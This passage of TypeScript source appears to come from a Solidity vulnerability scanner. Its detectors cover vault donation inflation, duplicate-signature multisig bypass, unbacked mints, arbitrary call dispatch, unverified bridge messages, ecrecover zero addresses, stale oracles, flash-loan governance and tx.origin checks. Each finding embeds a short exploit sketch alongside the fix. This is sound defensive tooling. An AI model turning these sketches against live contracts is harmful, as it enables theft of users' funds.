 * produced cross-talk on share-accounting-double-debit, whose ERC4626-style
 * `release` is a vault redemption. A bare `release(address, uint256)` takes no
 * message, so there is no cross-chain message to authenticate and nothing to
 * verify — it is not this class. Keying this rule on the name was the original
 * mistake; widening it would repeat that mistake in the other direction.
 */
const BRIDGE_HANDLER = /^(?:process|receive|execute|handle|onMessage|lzReceive|consume|claim|crossChain|finalize|complete)/i;

/**
 * A self-service payout: the transfer pays the caller an amount that was already
 * recorded against the caller.
 *
 * `claimComp()` pays `msg.sender` the value of `accrued[msg.sender]` and zeroes it —
 * permissionless by design, and nothing can be taken from anyone else. Without this
 * discriminator the rule fired critical on it, and on every other claim-style
 * function in the sample (KeepBonding x2, Ahoolee Token Sale, Launchpad,
 * CompoundTreasury: 7 of the 26 non-proxy criticals).
 *
 * Deliberately narrow: a MINT to msg.sender still fires, because minting on an
 * unverified inbound message creates value rather than releasing it — that is
 * Qubit Finance (2022, $80M), where the attacker deposited a fake token and was
 * minted real qTokens. So the exemption requires a transfer (not a mint) whose
 * amount is keyed to the caller.
 */
function payoutIsSelfService(clean: string): boolean {
  const paysCaller = /\.(?:transfer|safeTransfer\w*)\s*\(\s*(?:payable\s*\(\s*)?(?:msg\.sender|_msgSender\s*\(\s*\))/.test(clean);
  const amountKeyedToCaller = /\[\s*(?:msg\.sender|_msgSender\s*\(\s*\))\s*\]/.test(clean);
  const mintsToCaller = /(?:_mint|\.mint)\s*\(\s*(?:payable\s*\(\s*)?(?:msg\.sender|_msgSender\s*\(\s*\))/.test(clean);
  return paysCaller && amountKeyedToCaller && !mintsToCaller;
}

/** Governance functions that execute a decision. */
const GOV_EXECUTE = /(?:execute|commit|queue|proposeAndExecute|emergencyCommit|runProposal|apply)/i;
/** Live (non-checkpointed) voting-weight reads. */
const LIVE_WEIGHT = /\b(?:balanceOf|totalSupply|getVotes|getCurrentVotes|stakedBalance|depositedBalance)\s*\(/;
/** Snapshot / checkpoint evidence that makes the read safe. */
const SNAPSHOT_EVIDENCE = /getPriorVotes|checkpoints?|_snapshot|snapshotBlock|ERC20Votes|Checkpoints|getPastVotes|TimelockController|minDelay/i;

/**
 * 2021-2025 classes, per function.
 */

/**
 * 2022-2026 loss categories the corpus was thin on (2026-10-29).
 *
 * Added after measuring the incident record against our 60 detectors. Reentrancy —
 * the flagship of the SmartBugs-era corpus — fell from 23 incidents in 2023 to ONE in
 * 2026, while three categories kept producing eight-figure losses that no existing
 * rule addressed:
 *
 *   * Token & share accounting / vault inflation — the single most common classification
 *     in the current DeFiLlama record. `totalAssets()` read from `balanceOf(this)` lets
 *     anyone inflate the share price by transferring in directly (the ERC-4626 donation
 *     attack), and a `convertToShares` with no virtual offset rounds the first
 *     depositor's way.
 *   * Signature threshold bypass — Wormhole, $326M: the loop counts valid signatures
 *     but never rejects a duplicate, so one key meets a multisig threshold.
 *   * Unbacked mint — an externally callable mint whose amount comes from a parameter
 *     with nothing checking it against assets actually held.
 *
 * All three are source-shape detectable, which is why they are here rather than
 * deferred to a different analyser.
 */
function scanModernClasses(
  fn: FnModel,
  contract: ContractModel,
  parsed: string,
  delta: number,
  authed: boolean,
  push: (f: Finding) => void,
) {
  const src = fn.source;
  if (!src) return;
  const clean = stripCommentsAndStrings(src);
  const external = isExternallyCallable(fn);

  // --- vault-inflation-donation (ERC-4626 first-depositor / donation) ---------
  // totalAssets() measured as the contract's own token balance is inflatable by a
  // direct transfer: shares are priced off a number anyone can raise.
  const readsOwnBalance = /balanceOf\s*\(\s*address\s*\(\s*this\s*\)\s*\)/.test(clean) ||
    /balanceOf\s*\(\s*this\s*\)/.test(clean);
  if (/^(totalAssets|totalUnderlying|totalHoldings|underlyingBalance)$/i.test(fn.name) && readsOwnBalance) {
    push(make({
      severity: "high",
      swc: "SWC-105",
      title: `${fn.name} prices shares off a balance anyone can inflate`,
      confidence: "high",
      detector: "vault-inflation-donation",
      summary: `${fn.name} reports the vault's assets as its own token balance. That number is not controlled by the vault: anyone can transfer the underlying token in directly and raise it, which raises the share price without minting a share. The first-depositor variant of this drains a fresh vault with two transactions — deposit 1 wei, donate a large amount, then redeem the inflated share. This is the ERC-4626 donation class, and it is the most common classification in the current loss record.`,
      walkthrough: `1. ${fn.name} returns balanceOf(address(this)) as the vault's total assets.\n2. An attacker transfers the asset in directly; no shares are minted, so every existing share is now worth more.\n3. With one share, the attacker redeems at the inflated price. On a fresh vault with one depositor, they take the next depositor's deposit.\n4. Track assets in a storage counter the deposit/withdraw paths maintain, or apply the ERC-4626 virtual offset (virtual shares and assets) so a donation cannot move the price by more than rounding.`,
      exploitSolidity: `// Two transactions against a vault with one depositor:\nIERC20(asset).transfer(vault, 1);                       // 1 wei in, 1 share out\nIERC20(asset).transfer(vault, 10_000 ether);            // donation: no shares minted\nvault.redeem(1, attacker, attacker);                    // one share now redeems ~10k`,
      remediationSolidity: `// Track assets internally instead of reading the balance, and apply the virtual offset.\nuint256 private _totalAssets;\nfunction totalAssets() public view returns (uint256) {\n    return _totalAssets; // maintained by deposit/withdraw, immune to direct transfers\n}\n// or, for a plain 4626: return super.totalAssets() + 1; and totalSupply() + 10 ** decimals;`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
    return;
  }

  // A convertToShares that divides by totalAssets with no virtual offset rounds the
  // first depositor's way and is the same attack from the other side.
  if (
    /^convertTo(Shares|Assets)$/i.test(fn.name) &&
    /totalAssets\s*\(/.test(clean) &&
    // totalSupply is a public variable in most ERC-20/4626 implementations, so it
    // appears bare; ERC-4626's own interface has it as a function. Match both.
    /totalSupply\b/.test(clean)
  ) {
    const hasOffset = /\+\s*1\b|10\s*\*\*\s*decimals|virtual/i.test(clean);
    if (!hasOffset) {
      push(make({
        severity: "high",
        swc: "SWC-105",
        title: `${fn.name} converts with no virtual offset`,
        confidence: "medium",
        detector: "vault-inflation-donation",
        summary: `${fn.name} divides by totalAssets() and totalSupply() with no virtual shares or assets added. When totalSupply is zero or tiny the conversion is undefined or attacker-favourable, which is the arithmetic half of the ERC-4626 inflation attack: a first depositor can pick the ratio.`,
        walkthrough: `1. ${fn.name} computes a ratio of assets to supply with no offset.\n2. With one share outstanding, an attacker controls both sides of that ratio by transferring assets in.\n3. They redeem at the ratio they chose.\n4. Add the ERC-4626 virtual offset (or mint dead shares on the first deposit) so the ratio cannot be set by a donation.`,
        exploitSolidity: `// The attacker sets the ratio the next depositor converts at.\nIERC20(asset).transfer(address(vault), 1);            // 1 wei, 1 share\nIERC20(asset).transfer(address(vault), 5_000 ether);  // ratio now 5000:1`,
        remediationSolidity: `function convertToShares(uint256 assets) public view returns (uint256) {\n    uint256 supply = totalSupply();\n    return supply == 0 ? assets : assets * (supply + 10 ** decimals) / (totalAssets() + 1);\n}`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
    return;
  }

  // --- signature-threshold-no-dedupe (Wormhole 2022, $326M) -----------------
  // A loop over signatures that counts approvals and compares the count to a
  // threshold, with no set that records which signers were already seen.
  const loopsSignatures =
    /(signatures?|sigs?)\s*\[\s*\w+\s*\]/.test(clean) ||
    /for\s*\([^)]*(signatures?|sigs?)\.length/i.test(clean);
  const countsApprovals = /(valid|count|approved|verified|signers)\w*\s*(\+\+|\+=|=\s*\w+\s*\+\s*1)/i.test(clean);
  // The threshold is usually a PREFIXED identifier — validatorThreshold,
  // requiredSignatures, _threshold, sigThreshold, MIN_SIGNATURES — so the name must be
  // matched anywhere inside the identifier, not at its start.
  //
  // Measured 2026-10-29: the first version required the identifier to begin with
  // "threshold", so a textbook multisig (`validSignatures >= validatorThreshold`) was
  // silently missed. My own test passed because it used the one spelling real code
  // rarely uses. Testing against realistic shapes is what caught it.
  const comparesThreshold =
    /(>=|==)\s*\w*(threshold|required|quorum|min_?sigs?|min_?signatures|signatures_?required)\w*/i.test(clean);
  const rejectsDuplicates =
    /(seen|used|already|duplicate|signed)\s*\[/i.test(clean) ||
    /require\s*\(\s*!\s*\w+\s*\[/.test(clean) ||
    /recovered\s*>\s*\w+/i.test(clean);
  if (loopsSignatures && countsApprovals && comparesThreshold && !rejectsDuplicates) {
    push(make({
      severity: "critical",
      swc: "SWC-107",
      title: `${fn.name} counts signatures without rejecting duplicates`,
      confidence: "high",
      detector: "signature-threshold-no-dedupe",
      summary: `${fn.name} loops over a signature array, counts the ones that verify, and accepts the message once the count reaches a threshold — but nothing records which signer was already counted. The same valid signature can be supplied N times to satisfy an N-of-M multisig with a single key. This is Wormhole (February 2022, $326M): the guardian signature was verified, and repeated.`,
      walkthrough: `1. ${fn.name} verifies each signature in turn and increments a counter.\n2. The threshold check compares the counter, not the set of distinct signers.\n3. An attacker repeats one valid signature to reach the threshold with a single compromised or malicious key.\n4. Record each recovered signer and reject a repeat (a mapping, or require strictly increasing signer addresses), then compare distinct signers to the threshold.`,
      exploitSolidity: `bytes[] memory sigs = new bytes[](required);\nfor (uint i = 0; i < required; i++) sigs[i] = oneValidSignature;\nIVictim(bridge).${fn.name}(message, sigs); // one key satisfies an N-of-M threshold`,
      remediationSolidity: `address last = address(0);\nfor (uint i = 0; i < signatures.length; i++) {\n    address signer = recover(message, signatures[i]);\n    require(signer > last, "duplicate or unordered signer");\n    last = signer;\n    if (isGuardian[signer]) valid++;\n}\nrequire(valid >= threshold, "threshold not met");`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
    return;
  }

  // --- unbacked-mint ---------------------------------------------------------
  // An externally callable mint whose amount is a caller parameter, with no check
  // against assets actually held. Gated mints are the norm and are skipped: the
  // finding is a permissionless one.
  if (
    external &&
    !authed &&
    /(_mint|\.mint)\s*\(/.test(clean) &&
    fn.params.some((p) => /^uint/.test(p.typeName) && p.name) &&
    !/(deposit|collateral|backing|reserve|locked|deposited|supplied)\s*(\(|\[)/i.test(clean) &&
    !/require\s*\([^)]*(<=|>=)[^)]*(deposit|collateral|reserve|backing)/i.test(clean)
  ) {
    push(make({
      severity: "high",
      swc: "SWC-105",
      title: `${fn.name} mints an amount the caller chooses, backed by nothing`,
      confidence: "medium",
      detector: "unbacked-mint",
      summary: `${fn.name} is externally callable, takes an amount from its caller, and mints it without checking the caller supplied or locked any asset first. Nothing in the function ties the minted quantity to backing, so the supply is whatever the caller says. Unbacked and infinite mints are one of the most frequent classifications in the current loss record.`,
      walkthrough: `1. ${fn.name} mints a caller-supplied amount.\n2. No deposit, collateral or reserve check appears in the function.\n3. An attacker mints to themselves and redeems against whatever the token is accepted for.\n4. Mint only against a measured deposit, and gate the function if it is meant to be privileged.`,
      exploitSolidity: `IVictim(vault).${fn.name}(attacker, type(uint256).max);`,
      remediationSolidity: `function ${fn.name}(uint256 amount) external {\n    uint256 received = IERC20(asset).transferFrom(msg.sender, address(this), amount);\n    require(received == amount, "short transfer");\n    _mint(msg.sender, amount); // 1:1 with assets actually received\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }
}

function scanHistoricalFn(
  fn: FnModel,
  contract: ContractModel,
  parsed: string,
  delta: number,
  authed: boolean,
  push: (f: Finding) => void,
) {
  const src = fn.source;
  if (!src) return;
  const clean = stripCommentsAndStrings(src);
  const external = isExternallyCallable(fn);
  const paramNames = fn.params.map((p) => p.name).filter(Boolean);

  // --- arbitrary-dispatch-call (Poly Network 2021, Beanstalk 2022) --------
  const takesAddress = fn.params.some((p) => /^address/.test(p.typeName) && p.name);
  const takesBytes = fn.params.some((p) => /^bytes/.test(p.typeName) && p.name);
  const dispatches = paramNames.some((n) => {
    const esc = escapeRegExp(n);
    return new RegExp(`\\b${esc}\\s*\\.\\s*(?:call|delegatecall)\\s*[({]`).test(clean);
  });
  // A constrained target is not arbitrary: an allowlist, a fixed comparison,
  // or a target drawn from storage the caller cannot set.
  const constrained =
    /\b(?:allowed|allowlist|whitelist|trusted|approved|routers?|targets?)\w*\s*\[/i.test(clean) ||
    new RegExp(`require\\s*\\(\\s*(${paramNames.map((n) => escapeRegExp(n)).join("|") || "\\b"})\\s*==`).test(clean);
  if (external && takesAddress && takesBytes && dispatches && !constrained) {
    const delegates = paramNames.some((n) => new RegExp(`\\b${escapeRegExp(n)}\\s*\\.\\s*delegatecall`).test(clean));
    // A PROVEN guard caps the finding, per the standing guard-credit rule — it does
    // not erase it. Measured 2026-10-28 on Snowfork's Snowbridge Agent
    // (0xd803472c…46a8, 1,068 ETH): `invoke(address executor, bytes data)` guards with
    // `if (msg.sender != GATEWAY) revert Unauthorized();` and GATEWAY is immutable, so
    // an external attacker cannot reach it — yet it was reported critical, because this
    // rule never consulted `authed` (unlike bridge-message-auth, which does). The lead
    // is still worth stating: the authorised gateway forwards (executor, data), and if
    // it forwards user-supplied values this IS the Poly shape.
    const guarded = authed;
    push(make({
      severity: delegates && !guarded ? "critical" : "high",
      swc: "SWC-105",
      title: `${fn.name} executes a caller-supplied call target and calldata`,
      confidence: "high",
      detector: "arbitrary-dispatch-call",
      summary: `The function takes a target address and a calldata blob from its caller and executes them${delegates ? " with delegatecall, in this contract's own storage" : ""}.${guarded ? "\n\n[Capped: high — the function is access-controlled, so an external attacker cannot reach this path directly. Verify that the authorised caller does not forward user-supplied target and calldata: if it does, this is the Poly shape and the guard is on the wrong side of the door.]" : ""} Whoever controls the arguments controls what this contract does — and anything that trusts this contract by address inherits that control. This is the Poly Network shape (August 2021, $611M): the cross-chain manager executed a user-supplied _method on a user-supplied contract, the attacker brute-forced a 4-byte selector to reach the keeper-update function, and the bridge's own authority did the rest. Beanstalk's proposal executor is the same door from the governance side.`,
      walkthrough: `1. ${fn.name} is externally callable and forwards a caller-supplied target and payload.\n2. The caller therefore chooses both the code that runs and the context it runs in.\n3. Any privileged function this contract can reach becomes reachable by the caller — including governance state (Poly) or an arbitrary delegatecall (Beanstalk).\n4. Allowlist the target and the selector, or remove the free-form dispatch entirely: a bridge should forward mint/unlock on a fixed contract, not arbitrary calls.`,
      exploitSolidity: `// The attacker supplies BOTH the target and the selector.\nbytes memory payload = abi.encodeWithSelector(PRIVILEGED_SELECTOR, attackerKey);\nIVictim(target).${fn.name}(address(privilegedContract), payload);`,
      remediationSolidity: `mapping(address => bool) public allowedTarget;\nfunction ${fn.name}(address target, bytes calldata data) external {\n    require(allowedTarget[target], "target not allowed");\n    (bool ok,) = target.call(data);\n    require(ok, "dispatch failed");\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // --- bridge-message-auth: an inbound handler with no verification -------
  // The handler mints or releases, and shows NONE of the source-chain /
  // peer / proof vocabulary. Nomad's zero root and Qubit's unverified
  // deposit are the two 2022 cases; the zero-root half is checked at
  // contract level below, because the flaw there was the ROOT's value, not
  // the absence of a verify call.
  if (
    external &&
    BRIDGE_HANDLER.test(fn.name) &&
    BRIDGE_EFFECT.test(clean) &&
    !BRIDGE_VERIFICATION.test(clean) &&
    !authed &&
    !payoutIsSelfService(clean)
  ) {
    push(make({
      severity: "critical",
      swc: "SWC-105",
      title: `${fn.name} mints or releases on an unverified cross-chain message`,
      confidence: "high",
      detector: "bridge-message-auth",
      summary: `An inbound cross-chain handler releases value (mint or unlock) and shows no verification of WHERE the message came from: no source-chain id, no peer/trusted-remote check, no proof, no guardian signature. A message is only as trustworthy as its provenance check, and this one has none, so any caller can invoke the release path directly. This is the class that produced Qubit Finance (2022, $80M — a deposit message accepted without validation) and the KelpDAO release (2026, a forged packet that released 116,500 rsETH): the bridge did what it was configured to do.`,
      walkthrough: `1. ${fn.name} is the inbound path: a message arrives and value leaves.\n2. Nothing in the function establishes which chain, which sender, or which proof authorised it.\n3. Any address can call it, or can craft a message through whatever endpoint forwards to it.\n4. Verify provenance before the effect: source chain id, the trusted remote/peer, and a proof or validator signature — in that order, and revert on any mismatch.`,
      exploitSolidity: `// Call the release path directly: no message, no proof, no source chain.\nIVictim(target).${fn.name}(attacker, type(uint256).max, "");`,
      remediationSolidity: `function ${fn.name}(uint16 srcChainId, bytes calldata srcAddress, bytes calldata payload) external {\n    require(msg.sender == endpoint, "not endpoint");\n    require(srcChainId == trustedChain && keccak256(srcAddress) == trustedPeer, "untrusted source");\n    _release(payload);\n}`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // --- ecrecover-zero (2021-2022 signature class) ------------------------
  if (/\becrecover\s*\(/.test(clean)) {
    const checksZero = /!=\s*address\s*\(\s*0\s*\)|!=\s*address\s*\(\s*0x0+\s*\)|==\s*address\s*\(\s*0\s*\)/.test(clean);
    if (!checksZero) {
      const gatesValue = /\.\s*(?:transfer|safeTransfer|safeTransferFrom|mint|_mint)\w*\s*\(/.test(clean);
      push(make({
        severity: gatesValue ? "critical" : "high",
        swc: "SWC-122",
        title: `${fn.name} never checks that ecrecover returned a signer`,
        confidence: "high",
        detector: "ecrecover-zero",
        summary: "ecrecover returns address(0) when the signature is malformed — it does not revert. Code that compares the recovered address against a stored signer without first rejecting address(0) accepts a signature nobody produced, and if the stored signer is itself unset or zero the check passes outright. This is the signature class behind the 2021-2022 losses (Qubit Finance's unverified deposit path among them).",
        walkthrough: "1. ecrecover(sig) on a malformed signature returns address(0) instead of reverting.\n2. The comparison against the expected signer runs on that zero address.\n3. If the stored signer is zero or unset — a fresh contract, an uninitialised field — the check passes and the caller is treated as authorised.\n4. Reject address(0) explicitly, or use ECDSA.recover, which reverts.",
        exploitSolidity: `// v/r/s chosen so ecrecover returns address(0); if signer is unset, this passes.\nIVictim(target).${fn.name}(msg.sender, amount, uint8(0), bytes32(0), bytes32(0));`,
        remediationSolidity: `address signer = ecrecover(digest, v, r, s);\nrequire(signer != address(0), "invalid signature");\nrequire(signer == trustedSigner, "wrong signer");`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
  }

  // --- oracle-staleness --------------------------------------------------
  const roundData = /\blatestRoundData\s*\(/.test(clean);
  const legacyAnswer = /\blatestAnswer\s*\(/.test(clean);
  if (roundData || legacyAnswer) {
    const checksStaleness =
      /updatedAt/.test(clean) ||
      /answeredInRound/.test(clean) ||
      /(?:block\.timestamp|now)\s*-\s*\w*\s*(?:updated|time|ts)/i.test(clean);
    if (!checksStaleness) {
      push(make({
        severity: "medium",
        swc: null,
        title: `${fn.name} prices off a feed without a staleness check`,
        confidence: "medium",
        detector: "oracle-staleness",
        summary: legacyAnswer
          ? "latestAnswer() is the deprecated accessor: it returns a bare int with no round metadata at all, so the caller cannot tell whether the answer is from this block, this week, or a feed that stopped updating. Price-plumbing failures of this kind sit behind the oracle losses of 2021-2024 (Mango, BonqDAO, Venus), where collateral was valued off a number nobody checked the freshness of."
          : "latestRoundData() is consumed without checking updatedAt or answeredInRound, so a stale, zero, or never-updated round is treated as a live price. A feed that stops updating — a deprecated aggregator, a paused oracle, an L2 sequencer outage — keeps returning the last value, and collateral is valued against it. This is the price-plumbing half of the oracle losses of 2021-2024.",
        walkthrough: "1. The feed's answer is read and used as a price.\n2. Nothing establishes when that answer was produced.\n3. A stale or halted feed keeps returning its last value, so the protocol prices against a number that no longer reflects the market.\n4. Check updatedAt against a heartbeat and answeredInRound against roundId, revert when the answer is stale, and check the L2 sequencer uptime feed before trusting any price on a rollup.",
        exploitSolidity: "",
        remediationSolidity: `(uint80 roundId, int256 answer,, uint256 updatedAt, uint80 answeredInRound) = feed.latestRoundData();\nrequire(answer > 0, "bad answer");\nrequire(updatedAt > 0 && block.timestamp - updatedAt <= HEARTBEAT, "stale price");\nrequire(answeredInRound >= roundId, "incomplete round");`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }
  }
}

/**
 * 2021-2025 classes that need the whole contract.
 */
function scanHistoricalContract(
  contract: ContractModel,
  model: SourceModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  // --- arbitrary-dispatch-call, through an internal helper ---------------
  // The real Poly Network shape: the external entry validated the proof and
  // then handed a caller-supplied target to an internal `_executeCrossChainTx`
  // that did the call. The inline rule in scanHistoricalFn cannot see that
  // hop, so the helper is followed here: an internal function that dispatches
  // on its own parameter, reached by an external function that itself takes an
  // address (so the target is caller-fed).
  const externals = contract.functions.filter((f) => f.body !== null && isExternallyCallable(f));
  for (const helper of contract.functions) {
    if (helper.body === null || isExternallyCallable(helper)) continue;
    const helperBody = stripCommentsAndStrings(helper.source);
    const dispatchesOnParam = helper.params.some((p) => {
      if (!p.name) return false;
      return new RegExp(`\\b${escapeRegExp(p.name)}\\s*\\.\\s*(?:call|delegatecall)\\s*[({]`).test(helperBody);
    });
    if (!dispatchesOnParam) continue;
    const caller = externals.find(
      (f) =>
        f.params.some((p) => /^address/.test(p.typeName)) &&
        new RegExp(`\\b${escapeRegExp(helper.name)}\\s*\\(`).test(f.source) &&
        !isAuthed(f, contract, model),
    );
    if (!caller) continue;
    const delegates = /\.\s*delegatecall\s*[({]/.test(helperBody);
    push(make({
      severity: delegates ? "critical" : "high",
      swc: "SWC-105",
      title: `${caller.name} forwards a caller-supplied target to ${helper.name}, which executes it`,
      confidence: "high",
      detector: "arbitrary-dispatch-call",
      summary: `The external entry ${caller.name} passes a caller-supplied address into ${helper.name}, which calls it${delegates ? " with delegatecall" : ""}. The dispatch hop hides the pattern from a single-function scan, but the authority does not change: whoever supplies the target and payload chooses what this contract does. This is the Poly Network shape (August 2021, $611M) exactly — verifyHeaderAndExecuteTx handed a user-supplied target and method to _executeCrossChainTx, the attacker brute-forced a 4-byte selector, and the manager's own owner authority over the data contract did the rest.`,
      walkthrough: `1. ${caller.name} accepts a target address from its caller.\n2. It forwards that target to ${helper.name}, which performs the call.\n3. The caller therefore picks both the callee and the calldata — including selectors the protocol never meant to expose.\n4. Allowlist the target (and the selector) before the dispatch, and keep privileged state behind a separate, timelocked authority.`,
      exploitSolidity: `// Target and selector both attacker-chosen.\nbytes memory payload = abi.encodeWithSelector(PRIVILEGED_SELECTOR, attackerKey);\nIManager(target).${caller.name}(address(privilegedDataContract), "f1121318093", payload);`,
      remediationSolidity: `function ${caller.name}(address target, bytes calldata data) external {\n    require(allowedTargets[target], "target not allowed");\n    _dispatch(target, data);\n}`,
      locationFn: caller.name,
      locationLine: caller.line,
      snippet: snippet(parsed, caller.line + delta, delta),
    }));
    break;
  }

  // --- governance-live-voting-power (Beanstalk 2022) ---------------------
  const executeFns = contract.functions.filter(
    (f) => f.body !== null && isExternallyCallable(f) && GOV_EXECUTE.test(f.name) && !isAuthed(f, contract, model),
  );
  const liveReader = executeFns.find((f) => LIVE_WEIGHT.test(stripCommentsAndStrings(f.source)));
  const snapshotted = contract.functions.some((f) => SNAPSHOT_EVIDENCE.test(f.source)) ||
    contract.bases.some((b) => /ERC20Votes|Governor|Timelock/i.test(b));
  if (liveReader && !snapshotted) {
    push(make({
      severity: "high",
      swc: null,
      title: `${contract.name} executes a proposal on live voting power`,
      confidence: "medium",
      detector: "governance-live-voting-power",
      summary: `The execution path reads voting weight from a live balance (${LIVE_WEIGHT.exec(stripCommentsAndStrings(liveReader.source))?.[0] ?? "balanceOf"}) and the contract shows no snapshot or checkpoint. Weight acquired in the same transaction therefore counts, so a flash loan can rent a supermajority and execute in one block — the Beanstalk Farms attack (April 2022, ~$182M), and the Fortress Protocol and Elephant Money cases from the same six weeks. The fix is not a threshold: it is measuring weight at a block that precedes the proposal.`,
      walkthrough: `1. ${liveReader.name} decides whether a proposal executes by reading current voting weight.\n2. Voting weight is a live balance, so capital deposited moments ago counts the same as capital held for months.\n3. A flash loan supplies that capital, the proposal passes, and the loan is repaid in the same transaction.\n4. Snapshot the weight at (or before) the proposal block — getPriorVotes / ERC20Votes checkpoints — and put a real delay between a passing vote and execution.`,
      exploitSolidity: `// One transaction: borrow, deposit for weight, execute, repay.\nflashLoan(1_000_000_000e18);\nvault.deposit(borrowed); // weight is live, so it counts now\ngovernance.${liveReader.name}(maliciousProposalId);\nrepay();`,
      remediationSolidity: `// Weight fixed before the proposal existed; execution delayed after it passes.\nfunction votesAt(uint256 proposalId, address who) public view returns (uint256) {\n    return token.getPastVotes(who, proposals[proposalId].snapshotBlock);\n}\nrequire(block.timestamp >= proposals[id].eta, "timelock");`,
      locationFn: liveReader.name,
      locationLine: liveReader.line,
      snippet: snippet(parsed, liveReader.line + delta, delta),
    }));
  }

  // --- bridge-message-auth: the zero-root half (Nomad 2022) -------------
  // Nomad's handler DID verify a merkle proof — against a root that was
  // initialised to zero, which made every proof valid. The rule is the
  // root's value, not the presence of the check, so it is a contract-level
  // question: a proof root read from state, with no non-zero requirement.
  const verifies = contract.functions.some((f) => /\bverify\s*\(|MerkleProof|_proof/i.test(f.source));
  const rootVar = contract.stateVars.find((v) => /root/i.test(v.name));
  const requiresNonZeroRoot = contract.functions.some((f) =>
    new RegExp(`require\\s*\\(\\s*${rootVar ? escapeRegExp(rootVar.name) : "\\w*[Rr]oot"}\\s*!=\\s*(?:bytes32\\s*\\(\\s*0\\s*\\)|0x0*|0)\\s*[,)]`).test(f.source),
  );
  if (verifies && rootVar && !requiresNonZeroRoot) {
    push(make({
      severity: "critical",
      swc: null,
      title: `${contract.name} verifies proofs against a root it never proves is set`,
      confidence: "medium",
      detector: "bridge-message-auth",
      summary: `The contract verifies merkle proofs against ${rootVar.name}, and nothing requires that root to be non-zero. A root left at its zero default makes every proof valid — which is exactly the Nomad Bridge drain (August 2022, ~$190M): an upgrade initialised the committed root to 0x00, the verification accepted any message, and because the call was public the drain became a crowd event within hours.`,
      walkthrough: `1. ${rootVar.name} is the trust anchor for every inbound message.\n2. If it is zero — a fresh deployment, a re-initialised upgrade, a cleared value — the proof check degenerates and accepts arbitrary messages.\n3. Any caller can then process a message that was never sent.\n4. Require the root to be non-zero before verifying, and set it only through an authenticated path.`,
      exploitSolidity: `// With committedRoot == 0, any leaf proves against it.\nIBridge(target).process(forgedMessage, emptyProof);`,
      remediationSolidity: `require(${rootVar.name} != bytes32(0), "root unset");\nrequire(MerkleProof.verify(proof, ${rootVar.name}, leaf), "bad proof");`,
      locationFn: null,
      locationLine: rootVar.line,
      snippet: snippet(parsed, rootVar.line + delta, delta),
    }));
  }
}

function scanContract(
  contract: ContractModel,
  model: SourceModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  const stateNames = new Set(contract.stateVars.map((v) => v.name));
  const byName = new Map(contract.functions.map((f) => [f.name, f]));

  const direct = new Map<string, { writes: Set<string>; external: boolean; callees: Set<string>; externalKinds: Set<string> }>();
  for (const fn of contract.functions) {
    direct.set(fn.name, profile(fn, stateNames, byName));
  }
  // Fixpoint: internal calls inherit writes and external-ness.
  let moved = true;
  while (moved) {
    moved = false;
    for (const fn of contract.functions) {
      const row = direct.get(fn.name);
      if (!row) continue;
      for (const callee of row.callees) {
        const other = direct.get(callee);
        if (!other) continue;
        if (other.external && !row.external) {
          row.external = true;
          moved = true;
        }
        for (const k of other.externalKinds) {
          if (!row.externalKinds.has(k)) {
            row.externalKinds.add(k);
            moved = true;
          }
        }
        for (const w of other.writes) {
          if (!row.writes.has(w)) {
            row.writes.add(w);
            moved = true;
          }
        }
      }
    }
  }

  for (const mod of contract.modifiers) {
    if (/tx\.origin/.test(mod.source)) {
      if (isEoaGateOnly(mod.source)) {
        push(make({
          severity: "low",
          swc: "SWC-115",
          title: `Modifier ${mod.name} uses an EOA-gate (tx.origin == msg.sender)`,
          confidence: "high",
          detector: "tx-origin",
          summary: "The modifier only requires msg.sender == tx.origin, which blocks contract callers. It authenticates nobody: a phished EOA calling directly still passes. It also blocks legitimate contract wallets, multisigs, and account-abstraction accounts.",
          walkthrough: "1. The modifier requires msg.sender == tx.origin, so any contract call is rejected.\n2. That blocks vaults, multisigs, and account-abstraction wallets — not just attackers.\n3. It authenticates nobody: a phished EOA calling directly still passes.",
          exploitSolidity: "",
          remediationSolidity: "// If the goal is blocking contracts, accept the tradeoff explicitly (it breaks multisigs/AA). If the goal is authentication, check msg.sender against an allowlist instead.",
          locationFn: mod.name,
          locationLine: mod.line,
          snippet: mod.source.split("\n").slice(0, 12).join("\n"),
        }));
      } else if (isTxOriginDenyOnly(mod.source)) {
        push(make({
          severity: "low",
          swc: "SWC-115",
          title: `Modifier ${mod.name} uses tx.origin in a deny check (blacklist)`,
          confidence: "high",
          detector: "tx-origin",
          summary: "The modifier only uses tx.origin in a negated/blacklist check, which blocks rather than grants. It authenticates nobody, and the auth-bypass framing does not apply: the check can only revert. The residual effect is over-blocking — a blacklisted EOA cannot use any contract to call through.",
          walkthrough: "1. The check denies when tx.origin is blacklisted; it never grants access.\n2. A forwarding contract cannot bypass it: tx.origin is still the blacklisted signer.\n3. The cost is over-blocking, not a bypass.",
          exploitSolidity: "",
          remediationSolidity: "// If the deny is intentional (blacklist covers forwarded calls), keep it and document the over-blocking. If the goal is authentication, check msg.sender instead.",
          locationFn: mod.name,
          locationLine: mod.line,
          snippet: mod.source.split("\n").slice(0, 12).join("\n"),
        }));
      } else {
        push(make({
          severity: "high",
          swc: "SWC-115",
          title: `Modifier ${mod.name} trusts tx.origin`,
          confidence: "high",
          detector: "tx-origin",
          summary: "An authorization modifier compares tx.origin. Any contract the authorized account calls can forward into a protected function.",
          walkthrough: originWalk(mod.name),
          exploitSolidity: originExploit(contract.name, "withdraw"),
          remediationSolidity: originFix(),
          locationFn: mod.name,
          locationLine: mod.line,
          snippet: mod.source.split("\n").slice(0, 12).join("\n"),
        }));
      }
    }
  }

  // Fix 38: public-entry provenance per function, computed once per
  // contract from the (fixpoint-completed) callee map, plus whether
